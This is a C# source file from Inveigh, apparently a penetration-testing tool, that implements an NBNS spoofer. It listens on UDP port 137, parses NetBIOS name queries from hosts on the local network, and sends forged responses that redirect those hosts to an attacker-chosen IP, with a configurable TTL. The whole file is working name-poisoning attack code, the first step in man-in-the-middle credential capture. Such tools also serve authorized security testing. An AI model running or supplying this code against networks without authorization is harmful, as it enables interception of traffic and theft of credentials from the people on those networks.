using System;
using System.Net;
using System.Net.Sockets;
using System.IO;

namespace Inveigh
{
    class NBNS
    {

        public static void NBNSListener(string IP, string spooferIP, string nbnsTTL, string[] nbnsTypes)
        {
            byte[] spooferIPData = IPAddress.Parse(spooferIP).GetAddressBytes();
            byte[] ttlNBNS = BitConverter.GetBytes(Int32.Parse(nbnsTTL));
            Array.Reverse(ttlNBNS);
            IPEndPoint nbnsEndpoint = new IPEndPoint(IPAddress.Broadcast, 137);
            UdpClient nbnsClient = UDP.UDPListener("NBNS", IPAddress.Any.ToString(), 137, "IPv4");

            while (!Program.exitInveigh)
            {

                try
                {
                    byte[] udpPayload = nbnsClient.Receive(ref nbnsEndpoint);
                    byte[] nbnsQuestionsAnswerRRs = new byte[4];
                    System.Buffer.BlockCopy(udpPayload, 4, nbnsQuestionsAnswerRRs, 0, 4);
                    byte[] nbnsAdditionalRRs = new byte[2];
                    System.Buffer.BlockCopy(udpPayload, 10, nbnsAdditionalRRs, 0, 2);

                    if (String.Equals(BitConverter.ToString(nbnsQuestionsAnswerRRs), "00-01-00-00") && !String.Equals(BitConverter.ToString(nbnsAdditionalRRs), "00-01"))
                    {
                        string nbnsResponseMessage = "";
                        byte[] nbnsTransactionID = new byte[2];
                        System.Buffer.BlockCopy(udpPayload, 0, nbnsTransactionID, 0, 2);
                        byte[] nbnsRequestType = new byte[2];
                        System.Buffer.BlockCopy(udpPayload, 43, nbnsRequestType, 0, 2);
                        string nbnsQueryType = NBNSQueryType(nbnsRequestType);
                        byte[] nbnsType = new byte[1];
                        System.Buffer.BlockCopy(udpPayload, 47, nbnsType, 0, 1);
                        byte[] nbnsRequest = new byte[udpPayload.Length - 20];
                        System.Buffer.BlockCopy(udpPayload, 13, nbnsRequest, 0, nbnsRequest.Length);
                        string nbnsRequestHost = BytesToNBNSQuery(nbnsRequest);
                        IPAddress sourceIPAddress = nbnsEndpoint.Address;
                        nbnsResponseMessage = Util.CheckRequest(nbnsRequestHost, sourceIPAddress.ToString(), IP.ToString(), "NBNS", nbnsQueryType, nbnsTypes);

                        if (Program.enabledNBNS && String.Equals(nbnsResponseMessage, "response sent"))
                        {

                            if (Array.Exists(nbnsTypes, element => element == nbnsQueryType) && !String.Equals(BitConverter.ToString(nbnsType), "21"))
                            {
                                byte[] nbnsResponse = NBNS.GetNBNSResponse("listener", nbnsTTL, spooferIPData, Util.IntToByteArray2(137), udpPayload);
                                UDP.UDPListenerClient(sourceIPAddress, 137, nbnsClient, nbnsResponse);
                                nbnsClient = UDP.UDPListener("NBNS", IPAddress.Any.ToString(), 137, "IPv4");
                            }
                            else if (String.Equals(BitConverter.ToString(nbnsType), "21"))
                            {
                                nbnsResponseMessage = "NBSTAT request";
                            }
                            else
                            {
                                nbnsResponseMessage = "NBNS type disabled";
                            }

                        }

                        lock (Program.outputList)
                        {
                            Program.outputList.Add(String.Format("[+] [{0}] NBNS request for {1}<{2}> from {3} [{4}]", DateTime.Now.ToString("s"), nbnsRequestHost, nbnsQueryType, sourceIPAddress, nbnsResponseMessage));
                        }


                    }

                }
                catch (Exception ex)
                {
                    Program.outputList.Add(String.Format("[-] [{0}] NBNS spoofer error detected - {1}", DateTime.Now.ToString("s"), ex.ToString()));
                }

            }

        }

        public static string BytesToNBNSQuery(byte[] field)
        {
            string nbnsUTF8 = BitConverter.ToString(field);
            nbnsUTF8 = nbnsUTF8.Replace("-00", String.Empty);
            string[] nbnsArray = nbnsUTF8.Split('-');
            string nbnsQuery = "";

            foreach (string character in nbnsArray)
            {
                nbnsQuery += new System.String(Convert.ToChar(Convert.ToInt16(character, 16)), 1);
            }
            
            if (nbnsQuery.Contains("CA"))
            {
                nbnsQuery = nbnsQuery.Substring(0, nbnsQuery.IndexOf("CA"));
            }

            int i = 0;
            string nbnsQuerySubtracted = "";

            do
            {
                byte nbnsQuerySub = (byte)Convert.ToChar(nbnsQuery.Substring(i, 1));
                nbnsQuerySub -= 65;
                nbnsQuerySubtracted += Convert.ToString(nbnsQuerySub, 16);
                i++;
            }
            while (i < nbnsQuery.Length);

            i = 0;
            string nbnsQueryHost = "";

            do
            {
                nbnsQueryHost += (Convert.ToChar(Convert.ToInt16(nbnsQuerySubtracted.Substring(i, 2), 16)));
                i += 2;
            }
            while (i < nbnsQuerySubtracted.Length - 1);

            if (nbnsQuery.StartsWith("ABAC") && nbnsQuery.EndsWith("AC"))
            {
                nbnsQueryHost = nbnsQueryHost.Substring(2);
                nbnsQueryHost = nbnsQueryHost.Substring(0, nbnsQueryHost.Length - 1);
                nbnsQueryHost = String.Concat("<01><02>", nbnsQueryHost, "<02>");
            }

            return nbnsQueryHost;
        }

        public static string NBNSQueryType(byte[] field)
        {
            string nbnsQuery = BitConverter.ToString(field);
            string nbnsQueryType = "";

            switch (nbnsQuery)
            {
                case "41-41":
                    nbnsQueryType = "00";
                    break;

                case "41-42":
                    nbnsQueryType = "01";
                    break;

                case "41-43":
                    nbnsQueryType = "02";
                    break;

                case "41-44":
                    nbnsQueryType = "03";
                    break;

                case "43-41":
                    nbnsQueryType = "20";
                    break;

                case "42-4C":
                    nbnsQueryType = "1B";
                    break;

                case "42-4D":
                    nbnsQueryType = "1C";
                    break;

                case "42-4E":
                    nbnsQueryType = "1D";
                    break;

                case "42-4F":
                    nbnsQueryType = "1E";
                    break;

            }

            return nbnsQueryType;
        }

        public static byte[] GetNBNSResponse(string type, string nbnsTTL, byte[] spooferIPData, byte[] udpSourcePort, byte[] udpPayload)
        {
            Array.Reverse(udpSourcePort);
            byte[] ttlNBNS = BitConverter.GetBytes(Int32.Parse(nbnsTTL));
            Array.Reverse(ttlNBNS);
            byte[] nbnsTransactionID = new byte[2];
            System.Buffer.BlockCopy(udpPayload, 0, nbnsTransactionID, 0, 2);
            byte[] nbnsRequestType = new byte[2];
            System.Buffer.BlockCopy(udpPayload, 43, nbnsRequestType, 0, 2);
            string nbnsQueryType = NBNS.NBNSQueryType(nbnsRequestType);
            byte[] nbnsType = new byte[1];
            System.Buffer.BlockCopy(udpPayload, 47, nbnsType, 0, 1);
            byte[] nbnsRequest = new byte[udpPayload.Length - 20];
            System.Buffer.BlockCopy(udpPayload, 13, nbnsRequest, 0, nbnsRequest.Length);
            string nbnsRequestHost = NBNS.BytesToNBNSQuery(nbnsRequest);

            MemoryStream nbnsMemoryStream = new MemoryStream();

            if (String.Equals(type, "sniffer"))
            {
                nbnsMemoryStream.Write((new byte[2] { 0x00, 0x89 }), 0, 2);
                nbnsMemoryStream.Write(udpSourcePort, 0, 2);
                nbnsMemoryStream.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
                nbnsMemoryStream.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
            }

            nbnsMemoryStream.Write(nbnsTransactionID, 0, nbnsTransactionID.Length);
            nbnsMemoryStream.Write((new byte[11] { 0x85, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x20 }), 0, 11);
            nbnsMemoryStream.Write(nbnsRequest, 0, nbnsRequest.Length);
            nbnsMemoryStream.Write(nbnsRequestType, 0, 2);
            nbnsMemoryStream.Write((new byte[5] { 0x00, 0x00, 0x20, 0x00, 0x01 }), 0, 5);
            nbnsMemoryStream.Write(ttlNBNS, 0, 4);
            nbnsMemoryStream.Write((new byte[4] { 0x00, 0x06, 0x00, 0x00 }), 0, 4);
            nbnsMemoryStream.Write(spooferIPData, 0, spooferIPData.Length);

            if (String.Equals(type, "sniffer"))
            {
                nbnsMemoryStream.Position = 4;
                nbnsMemoryStream.Write(Util.IntToByteArray2((int)nbnsMemoryStream.Length), 0, 2);
            }

            return nbnsMemoryStream.ToArray();
        }

    }

}
